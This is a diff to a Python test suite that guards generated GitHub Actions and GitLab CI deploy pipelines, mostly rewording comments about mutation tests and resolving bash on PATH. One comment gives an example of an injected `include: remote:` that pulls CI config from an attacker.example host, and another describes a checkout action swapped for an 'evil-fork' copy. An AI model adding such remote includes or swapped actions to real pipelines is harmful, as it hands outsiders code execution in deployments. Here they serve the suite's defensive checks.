@@ -248,7 +248,7 @@ WHAT THIS GUARD DOES **NOT** BUY
   default branch, which makes the two DIFFERENT, not aligned — earlier wording
   here and in the generator claimed parity and was wrong. Closing it needs
   ``github.ref`` inside the job's ``if:``, and ``_EVENT_EQ_RE`` refuses ``&&``
-  (measured: the natural fix reds 6 tests), so the evaluator has to grow first.
+  (measured: the natural fix turns tests red), so the evaluator has to grow first.
 * **The GitLab `apply` has no dependency on validation, and this file does not
   ask for one.** The GitHub sibling is protected by ``needs: [validate]`` (see
   the #1356 reasoning below — losing that edge deploys an unvalidated config).
@@ -350,6 +350,9 @@ from test_init_project import CI_DEPLOY_COMBINATIONS  # noqa: E402
 _ACTIONLINT = shutil.which("actionlint")
 _CHECK_JSONSCHEMA = shutil.which("check-jsonschema")
 _NODE = shutil.which("node")
+# Resolved on PATH, not passed bare (#2560, same as #2328): on Windows
+# CreateProcess searches System32 before PATH, so a bare "bash" is WSL's.
+_BASH = shutil.which("bash") or "bash"
 
 _needs_actionlint = pytest.mark.skipif(
     _ACTIONLINT is None, reason="actionlint not on PATH")
@@ -489,7 +492,7 @@ def test_the_shell_join_is_not_defeated_by_a_scalar_script() -> None:
 
     Measured on the version that used `body.get(key, [])`: a job written with
     a SCALAR `script:` slipped past both the `config-diff` and the `\\bgit\\b`
-    assertions. Reverting the normaliser scored `9 passed` — the repository
+    assertions. Reverting the normaliser left every test green — the repository
     had NO control over that fix at all. This is it.
 
     Both forms carry the same two forbidden tokens, so a normaliser that
@@ -742,7 +745,7 @@ _EXPECTED_GL_JOBS = {
 # on `environment:`, so the three validation jobs were graded by nothing but
 # "does the job still exist" — and their gate is where the damage is quiet:
 # measured, pointing `validate-config`'s `changes:` at a path that matches
-# nothing left 277 passed, and `when: never` left 83 passed, while the
+# nothing left the suite green, and so did `when: never`, while the
 # customer's only config-validation job stopped firing on every pipeline and
 # `apply` stayed a live manual production deploy. The boundary paragraph in this
 # file's header also argues FROM these rules, so leaving them unpinned made a
@@ -750,7 +753,8 @@ _EXPECTED_GL_JOBS = {
 # ⛔ Top-level key set, exactly — the GitLab counterpart of the #1347 detector
 # the GitHub leg already had. `_gitlab_jobs()` FILTERS the ten global keywords
 # out before anything grades them, so an injected global was invisible by
-# construction. Measured, both 95 passed and both accepted by check-jsonschema:
+# construction. Measured, both left the suite green and both were accepted by
+# check-jsonschema:
 #   include: - remote: 'https://attacker.example/p.yml'   → third-party CI config
 #                                                           pulled into a pipeline
 #                                                           holding cluster-write
@@ -767,7 +771,7 @@ _EXPECTED_GL_TOP_LEVEL = {
 
 # job -> the stage it must run in. `stages:` order was pinned; each job's own
 # `stage:` value was only checked for MEMBERSHIP, so moving `apply` to
-# `stage: validate` left 95 passed and put the `environment: production` play
+# `stage: validate` left the suite green and put the `environment: production` play
 # button in stage 1 — the exact state the stages-order message says it prevents.
 # Order and assignment are two halves of one contract; pinning one is pinning
 # neither.
@@ -980,14 +984,14 @@ def _runs_under(name: str, event: str, jobs: dict, label: str,
 # Adversarial review deleted all three `apply` gates (making `kubectl apply -f`
 # / `helm upgrade --install` / `argocd app sync --prune`, every one of them
 # under `environment: production`, run on EVERY pull_request and every push to
-# main) and the whole suite stayed green at 222 passed — because a WIDER
+# main) and the whole suite stayed green — because a WIDER
 # reachable set contains no dead job. The blast radius of that direction is far
 # larger than #1356's, so the map is pinned exactly rather than floor-checked.
 # ⛔ The GitHub trigger's FILTERS, pinned like the GitLab `rules:` are. Event
 # names alone were the only thing checked, and a filter is where the damage is
 # quiet: measured, rewriting the generated `on:` to
 # `pull_request: {paths: ['this-path-does-not-exist/**']}` plus
-# `push: {branches: [no-such-branch]}` left 95 passed and zero red, while
+# `push: {branches: [no-such-branch]}` left the suite green, zero red, while
 # `validate` and `generate` stopped firing on every PR and push — and `apply`
 # (environment: production) stayed a live manual deploy. Exactly the asymmetry
 # this file names as its most productive defect shape, left on the leg that
@@ -1080,7 +1084,7 @@ _GH_JOB_EVENTS = {
 # ⛔ The `needs` EDGES, pinned separately — and that separation is the point.
 # The event map above cannot see them: deleting `apply`'s `needs: [validate]`
 # altogether leaves every job's reachable-event set unchanged, so the whole
-# suite stayed green under it (measured: 58 passed, identical to baseline)
+# suite stayed green under it (measured: identical to baseline)
 # while `apply` — which carries `environment: production` and runs
 # `kubectl apply -f` / `helm upgrade --install` / `argocd app sync --prune` —
 # lost its only "the config must pass validate first" gate. Third face of the
@@ -1190,7 +1194,7 @@ def _synthetic(if_expr, needs=None, events=("pull_request", "workflow_dispatch")
 # ⛔ The evaluator's ONLY safety property is that it refuses to score an `if:`
 # it does not understand. Nothing pinned that: adversarial review replaced both
 # `raise _UnsupportedIf` with `return True` — the exact relaxation the code
-# comment forbids in prose — and the suite stayed green at 52 passed, because
+# comment forbids in prose — and the suite stayed green, because
 # the two shipped generators happen to emit only the one supported shape. A
 # prose ⛔ stops no machine, so the property gets a counter-example test.
 _UNSUPPORTED_IFS = [
@@ -1313,7 +1317,7 @@ def test_generated_precommit_hooks_can_actually_run(generated, ci, deploy) -> No
         # An earlier version of this test stopped there and called itself "can
         # actually run", which was a name claiming more than the body did: two
         # edits that leave the hook launchable and failing on every commit both
-        # measured 318 passed. Everything below derives the argv pre-commit will
+        # measured fully green. Everything below derives the argv pre-commit will
         # really exec and holds it to the same CLI contract the workflow
         # artifacts are held to.
         argv = shlex.split(entry)
@@ -1328,7 +1332,7 @@ def test_generated_precommit_hooks_can_actually_run(generated, ci, deploy) -> No
         # the ONLY path inside that container that has anything to do with the
         # user's repo, so an absolute path anywhere else in the argv cannot
         # resolve. Measured: `--config-dir /data/conf.d` (the mount point the
-        # hand-rolled `docker run` version used) left 318 passed, and exits 2
+        # hand-rolled `docker run` version used) left the suite green, and exits 2
         # with "config-dir not found" on a real commit.
         for token in argv:
             if token.startswith("/"):
@@ -1347,7 +1351,7 @@ def test_generated_precommit_hooks_can_actually_run(generated, ci, deploy) -> No
         # nothing "leaves validate and generate dead on every PR". The third
         # generated artifact has the identical property and got a substring
         # check instead: measured, rewriting `^conf\.d/` to `^NOPEconf\.d/`
-        # left 341 passed because the old assertion only asked whether the
+        # left the suite green because the old assertion only asked whether the
         # pattern contained "conf". Derived from what `run_init` actually wrote,
         # so renaming the config directory moves both together.
         expected_files = rf"^{re.escape(config_dir)}/.*\.ya?ml$"
@@ -1363,7 +1367,7 @@ def test_generated_precommit_hooks_can_actually_run(generated, ci, deploy) -> No
         # key is the dangerous spelling, not the safe one. Whether that is
         # survivable is not a matter of taste: it depends on whether the target
         # subcommand declares a positional, which argparse knows and we derive.
-        # Measured: flipping it to true left 318 passed, and exits 2 with
+        # Measured: flipping it to true left the suite green, and exits 2 with
         # "unrecognized arguments: <path>" on a real commit.
         positionals = _da_tools_positionals()
         assert sub in positionals, (
@@ -1490,8 +1494,8 @@ def _unmarked_precommit_blocks(text: str) -> list[int]:
     A pure function, for the same reason `_undeclared_da_tools_usage` is one:
     the real pages have zero unmarked blocks — that is the fixed state — so
     asserting against them cannot tell this apart from `return []`. Measured:
-    replacing the caller's subtraction with an empty set left the section at 28
-    passed. The synthetic case below is the only input that distinguishes them.
+    replacing the caller's subtraction with an empty set left the section
+    green. The synthetic case below is the only input that distinguishes them.
     """
     return sorted(set(_precommit_fences(text)) - set(_marked_fences(text)))
 
@@ -2321,7 +2325,7 @@ def test_the_unsupported_if_corpus_is_not_empty() -> None:
     evaluator's ONLY safety property — its refusal to grade an `if:` it cannot
     read — so a silent emptying removes the protection without a red run.
     Measured: emptying this list and the parity file's `_BYPASSES` gave
-    81 passed / 2 skipped / exit 0. The file already argues this hazard for the
+    zero failures, only skips, and exit 0. The file already argues this hazard for the
     CLI matrix; the axes guarding the guards needed the same floor.
     """
     assert len(_UNSUPPORTED_IFS) >= 6, (
@@ -2350,8 +2354,8 @@ def test_the_dead_knob_detector_actually_detects() -> None:
     It is the sole detector behind two assertions, and on the real artifacts one
     of them is vacuous: the generated `workflow_dispatch:` declares no inputs at
     all, so that call reduces to `assert not []` on all nine combinations.
-    Measured: inserting `return []` at the top of `_unwired_knobs` left
-    151 passed / 6 skipped — byte-identical to baseline, zero tests died.
+    Measured: inserting `return []` at the top of `_unwired_knobs` left the
+    passed/skipped counts byte-identical to baseline, zero tests died.
 
     That is the shape this file already fixed for the reachability evaluator
     (three meta-tests at the `_synthetic` helper above) and for the shell-comment
@@ -2446,7 +2450,7 @@ def test_gitlab_jobs_reference_declared_stages(generated, ci, deploy) -> None:
     # missing; it says nothing about jobs APPEARING, and the appearing direction
     # is the dangerous one here. Measured: adding an `apply-hotfix` job that
     # runs `kubectl apply` under a bare `rules: - when: manual` and declares no
-    # `environment:` left the suite at 83 passed — invisible to the stage check
+    # `environment:` left the suite green — invisible to the stage check
     # (it has a valid stage) and invisible to the deploy-trigger check below
     # (which selects on `environment:`, a key the new job simply omits).
     # Selecting on a marker the subject chooses for itself is the same failure
@@ -2477,7 +2481,7 @@ _ENTRYPOINT = _REPO_ROOT / "components" / "da-tools" / "app" / "entrypoint.py"
 # `--prometheus` is injected by entrypoint.py only for the PROMETHEUS_COMMANDS
 # set, and `--config-dir` is an ordinary per-subcommand argument. Exempting them
 # re-opened the exact class this guard closes: adding `--prometheus` to the
-# shipped Stage 1 left 93 passed while the step exited 2 on every run.
+# shipped Stage 1 left the suite green while the step exited 2 on every run.
 #
 # ⛔⛔ The lesson is narrower than "verify docs": this constant was written one
 # round AFTER a finding whose stated conclusion was "when a chain of reasoning
@@ -2675,10 +2679,10 @@ def _strip_shell_comments(text: str) -> str:
     `run:` block, because there the `#` is part of the scalar. So moving an
     "is this knob read?" search from the raw file into the parsed steps closes
     only half the class — the prose just moved inside the string. Measured: with
-    the dead #1361 input restored (12 failed), adding one line
-    `# TODO: honour ${{ inputs.dry_run }}` to an existing `run:` block dropped it
-    to 8 failed, with both kustomize combinations fully green and the dead knob
-    still shipping.
+    the dead #1361 input restored (red), adding one line
+    `# TODO: honour ${{ inputs.dry_run }}` to an existing `run:` block turned
+    part of that red back to green, with both kustomize combinations fully
+    green and the dead knob still shipping.
 
     ⛔ Derived from the shell rule, and STRICTLY STRONGER than the nearest
     existing helpers — an earlier version of this docstring cited a
@@ -2721,8 +2725,8 @@ def _unwired_knobs(workflow: dict) -> list[str]:
     workflow-level `env:` block, so that an input bound to an env var counted as
     wired. That kills a real false positive and creates a worse false negative:
     `env: {DRY_RUN: ${{ inputs.dry_run }}}` with nothing reading `$DRY_RUN`
-    scored as wiring. Measured: the dead #1361 input alone → 12 failed; the same
-    input plus that one `env:` line → 93 passed, with the operator ticking
+    scored as wiring. Measured: the dead #1361 input alone → red; the same
+    input plus that one `env:` line → fully green, with the operator ticking
     "Dry-run mode (no actual apply)" and getting a real production apply. The
     binding is not the wiring — it is the first half of it.
 
@@ -2815,10 +2819,10 @@ def _assert_github_deploy_contract(
     ⛔ Shared on purpose. Three separate checks were written against the CLI
     artifact only, and the portal preview — a second, hand-written copy of the
     same workflow that the wizard shows customers as a "copy me" sample — was
-    left ungraded by all three. Measured, each against a 93-passed baseline:
+    left ungraded by all three. Measured, each against a green baseline:
     adding `permissions: {contents: write, id-token: write}` to the preview's
-    `apply` job → 93 passed; restoring the dead #1361 `dry_run` input to the
-    preview → 93 passed. Both defects this PR removed from the CLI could be
+    `apply` job → still green; restoring the dead #1361 `dry_run` input to the
+    preview → still green. Both defects this PR removed from the CLI could be
     re-shipped from the other generator without a single test going red.
 
     Putting the properties in one function called from both call sites is the
@@ -2833,8 +2837,8 @@ def _assert_github_deploy_contract(
     #
     # The first form of this rule only compared the scopes a job listed against
     # the workflow grant, i.e. it watched widening alone. Measured: adding
-    # `permissions: {contents: read}` to the `generate` job left 95 passed and
-    # zero red — while that job's only output, the sticky PR comment, goes back
+    # `permissions: {contents: read}` to the `generate` job left the suite
+    # green, zero red — while that job's only output, the sticky PR comment, goes back
     # to 403ing. That is exactly the defect this PR added the block to fix, put
     # back by a plausible "tighten this job" edit.
     #
@@ -2851,10 +2855,11 @@ def _assert_github_deploy_contract(
     # action's API surface, not from the job it happens to sit in.
     # ⛔ `actions/checkout` is in here because it is the step EVERY job runs and
     # it needs `contents: read` on a private repository — the customer's normal
-    # case. Measured: `permissions: {}` on the `validate` job left 95 passed
-    # while checkout 403s and the whole validate stage dies before it starts.
-    # The rule claimed to be bidirectional and was not: the widening half was
-    # live (a job granting `contents: write` reds 6), the demand half knew one
+    # case. Measured: `permissions: {}` on the `validate` job left the suite
+    # green while checkout 403s and the whole validate stage dies before it
+    # starts. The rule claimed to be bidirectional and was not: the widening
+    # half was live (a job granting `contents: write` goes red), the demand
+    # half knew one
     # action.
     #
     # ⚠️ STATED LIMIT, because this derivation cannot be complete: it reads
@@ -2866,8 +2871,9 @@ def _assert_github_deploy_contract(
     # pin instead, which was false twice over: the former pins job NAMES, and the
     # latter only covers the portal leg. Measured against that claim: adding a
     # fifth step `uses: peter-evans/create-or-update-comment@v4` to the CLI
-    # `generate` job left 95 passed, and renaming all four `actions/checkout@v4`
-    # to `evil-fork/checkout@v1` also left 95 passed — the second is worse,
+    # `generate` job left the suite green, and renaming all four
+    # `actions/checkout@v4` to `evil-fork/checkout@v1` also left it green — the
+    # second is worse,
     # because `_demands` matches on the action name, so RENAMING an action
     # exempts it from its own scope requirement. That is selection on a marker
     # the subject chooses for itself, the exact shape this file criticises
@@ -2880,7 +2886,8 @@ def _assert_github_deploy_contract(
     # ⛔ Floor. `_NEEDS` is consumed by a loop, which is the shape in this file
     # that retires SILENTLY — the same one `_expected_gl_job_rules` got a floor
     # for, in this same file, and this dict was missed. Measured: `_NEEDS = {}`
-    # left 84 passed even with `permissions: {}` on `validate`, i.e. the entire
+    # left the suite green even with `permissions: {}` on `validate`, i.e. the
+    # entire
     # demand half of the rule disappears without a red run.
     assert len(_NEEDS) >= 2, (
         f"_NEEDS has {len(_NEEDS)} entries — emptying it makes the demand half "
@@ -3034,8 +3041,9 @@ def _assert_github_deploy_contract(
     # (1c) Every `da-tools <sub> --flag` this workflow runs must be a real flag,
     # and `lint` must keep `--ci`. ⛔ Both properties were added to the CLI leg
     # only. Measured: re-adding `--ci` to the portal preview's validate step left
-    # 104 passed while the identical edit on the CLI leg reds 6; dropping `--ci`
-    # from the GitHub lint step left 93 passed while the GitLab one reds 6. This
+    # the suite green while the identical edit on the CLI leg goes red; dropping
+    # `--ci` from the GitHub lint step left it green while the GitLab one goes
+    # red. This
     # helper exists precisely so a new property cannot land on one leg — the two
     # newest properties landed on one leg anyway, so they move in here.
     declared = _da_tools_subcommands()
@@ -3074,15 +3082,15 @@ def _assert_github_deploy_contract(
     # `continue-on-error` job's FAILURE as success when evaluating `needs:`, so
     # one line turns the whole `needs: [validate]` edge this PR pins into
     # decoration and `apply` deploys config that failed schema/routing/policy
-    # validation. Measured: `continue-on-error: true` on `validate` left 95
-    # passed. The repo already treats this as a check-defeating mechanism for
+    # validation. Measured: `continue-on-error: true` on `validate` left the
+    # suite green. The repo already treats this as a check-defeating mechanism for
     # its OWN workflows (tests/dx/test_pr_preflight_checks.py) — that rule had
     # simply never been swept onto the artifacts we generate.
     # ⛔ BOTH levels. GitHub accepts `continue-on-error` on a job AND on each
     # step, and the step form is the more dangerous one: the step is recorded
     # failed while the JOB concludes success, so `needs: [validate]` is satisfied
     # by a `validate` that failed schema/routing/policy. Measured: one line on
-    # the validate step left 95 passed, zero red.
+    # the validate step left the suite green, zero red.
     # ⛔ The sibling guard already had this derivation
     # (tests/ops/test_nightly_scan_matrix_drift.py, `step.get("continue-on-error",
     # job_coe)`) and only the job half was carried over here — a rule present in
@@ -3109,7 +3117,7 @@ def _assert_github_deploy_contract(
     # (3) The deploy job must still NAME its environment. Three separate pieces
     # of reasoning in this file rest on `apply` carrying `environment:
     # production`, and the GitLab side asserts its equivalent — this side did
-    # not, and deleting the key from all three deploy branches left 93 passed.
+    # not, and deleting the key from all three deploy branches left the suite green.
     # It is also the only mitigation currently available for the stated
     # boundary that GitHub's `apply` is dispatchable from an unmerged branch:
     # an environment carries required reviewers and deployment branch policies.
@@ -3128,7 +3136,7 @@ def _assert_github_deploy_contract(
     # not on the ref — names those protections as the only mitigation. Renaming
     # the environment silently decouples every rule attached to it, and
     # `assert apply_env` could not tell. Measured: renaming it in all six deploy
-    # branches left 95 passed. A boundary must not rest on an unenforced fact.
+    # branches left the suite green. A boundary must not rest on an unenforced fact.
     # One assertion, not two: an earlier version kept a follow-up `assert
     # apply_env` AFTER this equality, so it could never fail and its message —
     # the one explaining why the environment is load-bearing — was unreachable.
@@ -3221,7 +3229,7 @@ def test_every_declared_workflow_input_is_read_by_something(
     # text` was the first form and it is satisfied by a comment — this generator
     # emits large comment blocks into its output, so measured: restoring the
     # #1361 input plus one line `# TODO: wire inputs.dry_run into the apply
-    # steps` left the suite at 93 passed with the defect fully back. The subject
+    # steps` left the suite green with the defect fully back. The subject
     # of "does anything READ this" is the executable surface, never the prose
     # next to it. (Same class as the run:/prose confusion fixed in the nightly
     # scan guard — a class fixed in one file has to be swept in the others.)
@@ -3275,7 +3283,7 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # ⛔ Floor first. This pin is consumed by a `for … in .items()` loop, which
     # is the one exact-pin shape in this file that RETIRES SILENTLY: every other
     # one is an `==` or `in` and reds when emptied, but emptying this dict left
-    # 95 passed. The rules it pins are load-bearing (a `when: never` on
+    # the suite green. The rules it pins are load-bearing (a `when: never` on
     # validate-config is caught by nothing else), so it gets the same floor the
     # counter-example corpora got.
     #
@@ -3329,13 +3337,14 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # ⛔ Every job's image, not just the deploy stage's. The GitHub leg pins its
     # whole `uses:` set with versions; here only `apply`'s image was pinned
     # (test_init_project.py), so swapping `validate-config`'s
-    # `image: $DA_TOOLS_IMAGE` for `alpine:3.20` left 95 passed — the validation
+    # `image: $DA_TOOLS_IMAGE` for `alpine:3.20` left the suite green — the
+    # validation
     # stage would then run without the tool it exists to run.
     for jname, job in jobs.items():
         image = job.get("image")
         image = image.get("name") if isinstance(image, dict) else image
         # ⛔ …and the variable must EXIST. `startswith("$")` alone accepted
-        # `$DA_TOOLS_IMAGE_TYPO` (93 passed, schema happy) — GitLab expands an
+        # `$DA_TOOLS_IMAGE_TYPO` (suite green, schema happy) — GitLab expands an
         # undefined variable to empty, so the job stops running the tool it
         # exists to run. Presence of a sigil is not a reference.
         assert str(image).lstrip("$").strip("{}") in (pipeline.get("variables") or {}), (
@@ -3354,7 +3363,7 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # shape (`_NEEDS`, `_EXPECTED_GL_JOB_RULES`, `_UNSUPPORTED_IFS`,
     # `_BYPASSES`, `DEPLOY_CHOICES`) — this one was missed. Measured: emptying
     # it while moving all three `apply` jobs into `stage: validate` left
-    # 93 passed, i.e. the production play button in stage 1 with no red.
+    # the suite green, i.e. the production play button in stage 1 with no red.
     assert set(_EXPECTED_GL_JOB_STAGES) == _EXPECTED_GL_JOBS, (
         f"_EXPECTED_GL_JOB_STAGES covers {sorted(_EXPECTED_GL_JOB_STAGES)}, "
         f"but the job set is {sorted(_EXPECTED_GL_JOBS)} — every job needs a "
@@ -3371,7 +3380,8 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # ⛔ GitLab's SECOND level: `allow_failure` is legal inside a `rules:` entry
     # and overrides the job-level value. Banning only the job level is the same
     # one-level-of-two gap the GitHub leg had for `continue-on-error` — measured:
-    # `allow_failure: true` on `apply`'s rule entry left 95 passed. (The three
+    # `allow_failure: true` on `apply`'s rule entry left the suite green. (The
+    # three
     # validation jobs are incidentally covered by the exact rules pin, so the
     # hole landed exactly on the deploy job.)
     for jname, job in jobs.items():
@@ -3409,13 +3419,13 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # artifact only, and the GitLab one shipped the identical defect at the same
     # time: `variables: MONITORING_NS` declared in all three deploy branches
     # while every script hardcoded `-n monitoring`. Measured: reverting the
-    # GitHub side to hardcoded literals reds 4 tests; the same defect on this
+    # GitHub side to hardcoded literals goes red; the same defect on this
     # side red nothing, because nothing looked. A property enforced on one leg
     # of a pair is the shape that has produced the most defects in this file.
     # ⛔ Shell comments stripped, and EVERY place GitLab lets a variable be read.
     # Two separate holes were measured here: a `script:` line that only mentions
     # `$MONITORING_NS` inside a `# TODO:` comment made the whole guard pass
-    # (84 passed, 0 failed) with the dead variable still shipping; and the
+    # (suite green, zero failed) with the dead variable still shipping; and the
     # surface omitted `before_script`, `after_script`, `environment:`,
     # `artifacts:`, job-level `variables:` and variable-to-variable
     # interpolation, so a genuinely-read variable would have been reported dead.
@@ -3433,7 +3443,7 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # `_strip_shell_comments(str(script)) == str(script)`. The previous version
     # of this block added the stripper and claimed the false negative was closed;
     # it was not — a `- |` block whose only mention of `$MONITORING_NS` was a
-    # `# TODO:` line still passed 95/95. Flattening to scalars first is the
+    # `# TODO:` line still passed every test. Flattening to scalars first is the
     # difference between calling the helper and using it.
     def _flat(value) -> list[str]:
         if isinstance(value, str):
@@ -3455,7 +3465,7 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # argument for removing `allow_failure` is "`da-tools lint --ci` exits
     # non-zero on ERROR only" — drop the flag and the command reports violations
     # and exits 0, so the job passes and the deny-list stops gating. Measured:
-    # dropping it left 95 passed. A guard whose justification rests on a flag
+    # dropping it left the suite green. A guard whose justification rests on a flag
     # must pin that flag. (`validate-config` is the mirror case and needs the
     # OPPOSITE: it declares no `--ci` and exits non-zero on failure by default —
     # see the CLI-flag guard, which now catches passing one that does not exist.)
@@ -3495,7 +3505,7 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
     # order is the ONLY thing sequencing it after validation — and this file's
     # boundary paragraph reasons from exactly that. Membership was asserted;
     # sequence was not. Measured: reordering to `[apply, validate, generate]`
-    # left 95 passed, and the manual play button then sits in stage 1, where an
+    # left the suite green, and the manual play button then sits in stage 1, where an
     # operator can deploy before `validate-config` has run at all.
     # `generate` sits between them again (issue 1444). Its only job is
     # merge-request-only and `apply` is default-branch-only, so they never
@@ -3541,7 +3551,7 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
         # single string (`" ".join(...)`) before looking for CI_DEFAULT_BRANCH,
         # which turned a for-all into an exists — measured: adding
         # `- if: $CI_PIPELINE_SOURCE == "merge_request_event"` / `when: manual`
-        # beside the branch rule left the suite at 93 passed while restoring the
+        # beside the branch rule left the suite green while restoring the
         # every-merge-request deploy button this test exists to prevent.
         for entry in rules:
             assert isinstance(entry, dict), (
@@ -3559,14 +3569,14 @@ def test_gitlab_deploy_jobs_are_not_offered_on_every_pipeline(
             # ⛔ EXACT expression, allowlisted — not "does the string mention
             # CI_DEFAULT_BRANCH". Substring matching on an expression grades the
             # variable's PRESENCE, never its MEANING, and both ways of widening
-            # survive it. Measured, each against an 83-passed baseline:
-            #   `$CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH`   -> 83 passed
+            # survive it. Measured, each against a green baseline:
+            #   `$CI_COMMIT_BRANCH != $CI_DEFAULT_BRANCH`   -> still green
             #   `... == ... || $CI_PIPELINE_SOURCE == "merge_request_event"`
-            #                                               -> 83 passed
+            #                                               -> still green
             # The first inverts the guard (deploy from every branch EXCEPT main);
             # the second re-opens every merge request. Note the second is the
             # same widening the per-entry loop above already catches when it is
-            # written as a separate entry (control: 6 failed) — moving it inside
+            # written as a separate entry (control: red) — moving it inside
             # one entry's expression walked straight past. Fixing the aggregation
             # across entries and leaving it inside an entry is the identical
             # mistake one level down, which is why this is now an equality
@@ -3798,7 +3808,7 @@ def test_portal_preview_actually_varies_with_the_deploy_choice(tmp_path) -> None
     same YAML three times, still green.
 
     Measured before this existed: renaming ``config.deploy`` to
-    ``config.deployMethod`` in generators.js left 64 passed unchanged.
+    ``config.deployMethod`` in generators.js left the suite green, unchanged.
 
     Pairwise distinctness is the assertion because it needs no knowledge of what
     each branch should contain — it only requires that the choice reached the
@@ -4143,7 +4153,7 @@ def _normalized_commands(text: str) -> list[str]:
 #
 # Both legs are pinned because the guard that was missing here was missing on
 # BOTH: measured, deleting `kubectl apply --dry-run=server` (and its echo) from
-# the GitHub kustomize branch left 318 passed, and the GitLab branch carries the
+# the GitHub kustomize branch left the suite green, and the GitLab branch carries the
 # same dry-run with no assertion either. The old per-branch tests used
 # `'kustomize build' in yaml_str`, so a whole branch vanishing turned red while
 # anything INSIDE a branch could be rewritten freely.
@@ -4187,7 +4197,7 @@ _EXPECTED_GL_APPLY: dict[str, list[str]] = {
 # reasoning left `generate` with no WHAT-level assertion at all, and the
 # asymmetry was introduced by the very commit that added them. Measured:
 # deleting the entire `Config diff (blast radius)` step (10 lines) left
-# 326 passed / 6 skipped — zero red. The `uses:` set pin catches "the sticky
+# the suite green — zero red. The `uses:` set pin catches "the sticky
 # comment step was removed"; nothing caught "the step that produces its input
 # was removed", which leaves a comment action pointing at a file nobody writes.
 #
@@ -4398,7 +4408,7 @@ def test_generate_stage_body_is_pinned_on_both_legs(generated, ci, deploy) -> No
         # removed', which leaves a comment action pointing at a file nobody
         # writes" — is a statement about a LINK, and only one end of it was
         # fastened. Measured: repointing the commenter at
-        # `.output/NOT-PRODUCED.md` left 341 passed, zero red.
+        # `.output/NOT-PRODUCED.md` left the suite green, zero red.
         #
         # Derived on both ends: the produced set comes from the redirect targets
         # in the pinned script, the consumed path from the step's own `with:`.
@@ -5497,7 +5507,7 @@ def _run_generated_step(step: dict, wf_env: dict, job_env: dict, work: Path,
     # `bash -e` and a RELATIVE script name: that is the default shell Actions
     # uses for `run:` (note: no pipefail), and an absolute Windows path gets
     # mangled by this bash.
-    return subprocess.run(["bash", "-e", "_step.sh"], cwd=work,
+    return subprocess.run([_BASH, "-e", "_step.sh"], cwd=work,
                           capture_output=True, encoding="utf-8",
                           errors="replace", timeout=120)
 
@@ -5847,7 +5857,7 @@ def test_declared_variable_values_match_their_source(tmp_path, ci, deploy) -> No
     always read by something (the #1361 dead-knob class). That check is about
     the NAME. Nothing looked at the VALUE, and a wrong value fails in the
     quietest possible direction: measured, changing `CONFIG_DIR: conf.d` to
-    `configs` on BOTH legs left 318 passed while `run_init` still wrote only
+    `configs` on BOTH legs left the suite green while `run_init` still wrote only
     `conf.d/`. The GitHub leg mounts
     ``-v ${{ github.workspace }}/${{ env.CONFIG_DIR }}:/data/conf.d:ro`` and
     docker CREATES a missing bind source as an empty directory, so Stage 1 then
@@ -5921,7 +5931,7 @@ def test_declared_variable_values_match_their_source(tmp_path, ci, deploy) -> No
     # because the next reader may weaken the assertions above believing the
     # floor backstops them. The CONFIG_DIR comparisons are unconditional, so a
     # missing key already fails there (`env.get(...)` returns None, measured:
-    # 6 red). What this floor actually catches is narrower: a future edit that
+    # red). What this floor actually catches is narrower: a future edit that
     # wraps BOTH legs' checks in `if "X" in env:` the way MONITORING_NS is
     # wrapped, at which point every assertion becomes skippable and the test
     # would pass having compared nothing.
@@ -6009,7 +6019,7 @@ def test_portal_file_tree_matches_what_init_writes(
     deploy=argocd``), which is why five rounds of review over these two
     generators never surfaced it: every existing test agreed with the wizard.
     Measured before this test existed: with the old tree restored, the full
-    file ran 297 passed.
+    file ran green.
 
     Both sides are read from the artifact — the portal's exported path list and
     a walk of the directory run_init really wrote — so neither can be satisfied
@@ -8366,7 +8376,7 @@ def test_the_fallback_report_is_executed_not_just_pinned(
     script.write_text(str(step["run"]), encoding="utf-8")
     routes, snapshot, diff = outcomes
     proc = subprocess.run(
-        ["bash", "-e", str(script)], cwd=work, capture_output=True, text=True,
+        [_BASH, "-e", str(script)], cwd=work, capture_output=True, text=True,
         encoding="utf-8", timeout=60,
         env={**os.environ, "ROUTES_OUTCOME": routes,
              "SNAPSHOT_OUTCOME": snapshot, "DIFF_OUTCOME": diff},
